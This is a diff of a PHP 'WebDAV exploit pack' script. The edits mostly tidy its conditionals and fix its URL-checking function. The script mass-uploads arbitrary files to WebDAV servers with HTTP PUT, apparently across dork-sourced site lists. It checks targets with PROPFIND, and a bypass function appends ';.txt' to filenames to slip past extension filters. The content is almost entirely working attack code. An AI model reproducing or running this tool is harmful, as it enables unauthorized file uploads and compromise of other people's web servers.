@@ -9,7 +9,7 @@ echo "
     | |   | / /\ \ \/ /___)  _ \| |/ _ \| |  _) 
     | |__/ / |__| \  /___ | | | | | |_| | | |__ 
     |_____/|______|\/(___/| ||_/|_|\___/|_|\___)
-    ######################| |###################   
+    ######################| |###################	 
     ######################|_|###################
   
       WebDAV exploit pack - coded by pers0nant
@@ -19,7 +19,7 @@ echo "
 
 $arg = getopt("", array("url:", "multi:", "server:", "upload:", "valid", "dork:"));
 
-if(isset($arg["url"])){
+if(isset($arg["url"])) {
 
 	if(!check_url($arg["url"])) die("    [*] URL is not valid\r\n\r\n\r\n");
 	
@@ -36,19 +36,13 @@ if(isset($arg["url"])){
 		
 		if($val) echo "    [*] the file will be uploaded as ".$filename."\r\n\r\n";
 			
-		if(put($url, $arg["upload"])) {
-		
-			echo "    [!] ".$filename." was successfully uploaded\r\n\r\n\r\n";
-			
-		} else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n\r\n\r\n";
+		if(put($url, $arg["upload"])) echo "    [!] ".$filename." was successfully uploaded\r\n\r\n\r\n";
+		else echo "    [x] failed to upload ".basename($arg["upload"])."\r\n\r\n\r\n";
 	
 	} elseif(isset($arg["valid"])) {
 	
-		if(propfind($url)) {
-		
-			echo "    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n";
-
-		} else echo "    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n";
+		if(propfind($url)) echo "    [!] ".$arg["url"]." is possibly vulnerable\r\n\r\n\r\n";
+		else echo "    [x] ".$arg["url"]." is not vulnerable\r\n\r\n\r\n";
 		
 	}
 
@@ -76,11 +70,8 @@ if(isset($arg["url"])){
 		
 			$site = clean($url);
 	
-			if(put($site, $arg["upload"])) {
-			
-				echo "    [!] ".$site."\r\n";
-			
-			} else echo "    [x] ".$site."\r\n";
+			if(put($site, $arg["upload"])) echo "    [!] ".$site."\r\n";
+			else echo "    [x] ".$site."\r\n";
 	
 		}
 	
@@ -90,11 +81,8 @@ if(isset($arg["url"])){
 		
 			$site = clean($url);
 	
-			if(propfind($site)) {
-			
-				echo "    [!] ".$site."\r\n";
-			
-			} else echo "    [x] ".$site."\r\n";
+			if(propfind($site)) echo "    [!] ".$site."\r\n";
+			else echo "    [x] ".$site."\r\n";
 	
 		}
 	
@@ -153,11 +141,8 @@ if(isset($arg["url"])){
 			
 		foreach($list as $url) {
 		
-			if(put($url, $arg["upload"])) { 
-			
-				echo "    [!] ".$url."\r\n";
-			
-			} else echo "    [x] ".$url."\r\n";
+			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
+			else echo "    [x] ".$url."\r\n";
 		
 		}
 	
@@ -188,11 +173,8 @@ if(isset($arg["url"])){
 			
 		foreach($list as $url) {
 		
-			if(put($url, $arg["upload"])) {
-			
-				echo "    [!] ".$url."\r\n";
-			
-			} else echo "    [x] ".$url."\r\n";
+			if(put($url, $arg["upload"])) echo "    [!] ".$url."\r\n";
+			else echo "    [x] ".$url."\r\n";
 		
 		}
 	
@@ -200,11 +182,8 @@ if(isset($arg["url"])){
 	
 		foreach($list as $url) {
 		
-			if(propfind($url)) {
-			
-				echo "    [!] ".$url."\r\n";
-			
-			} else echo "    [x] ".$url."\r\n";
+			if(propfind($url)) echo "    [!] ".$url."\r\n";
+			else echo "    [x] ".$url."\r\n";
 		
 		}
 	
@@ -385,15 +364,8 @@ function move($url, $base, $file) {
 	$response = curl_exec($c);
 	curl_close($c);
 	
-	if(preg_match("/(Created|No Content)/", $response)) {
-		
-		return TRUE;
-	
-	} else {		
-	
-		return FALSE;
-	
-	}
+	if(preg_match("/(Created|No Content)/", $response)) return TRUE;
+	else return FALSE;
 
 }
 
@@ -417,29 +389,16 @@ function propfind($url) {
 
 function check_url($url) {
 
-    $curl = curl_init($url);
-    curl_setopt($curl, CURLOPT_NOBODY, 1);
-    $result = curl_exec($curl);
+	$curl = curl_init($url);
+	curl_setopt($curl, CURLOPT_NOBODY, 1);
+	$result = curl_exec($curl);
     
-	if ($result !== FALSE) {
+	if($result) {
     
-		$intReturnCode = curl_getinfo($curl, CURLINFO_HTTP_CODE);
-    
-		if ($intReturnCode != 200 && $intReturnCode != 302 && $intReturnCode != 304) {
+		$code = curl_getinfo($curl, CURLINFO_HTTP_CODE);
+		return ($code == 200 ? TRUE : FALSE);
         
-			return FALSE;
-        
-		} else {
-
-			return FALSE;
-            
-		}
-        
-	} else {
-    
-		return FALSE;
-    
-	}
+	} else return FALSE;
 	
 }
 
@@ -458,11 +417,8 @@ function bypass($file) {
 	$base = basename($file);
 	$exp = explode(".", $base);
 	
-	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") {
-	
-		return array($base.";.txt", TRUE);
-	
-	} else return array($base, FALSE);
+	if($exp[1] !== "txt" && $exp[1] !== "htm" && $exp[1] !== "html") return array($base.";.txt", TRUE);
+	else return array($base, FALSE);
 	
 }
 
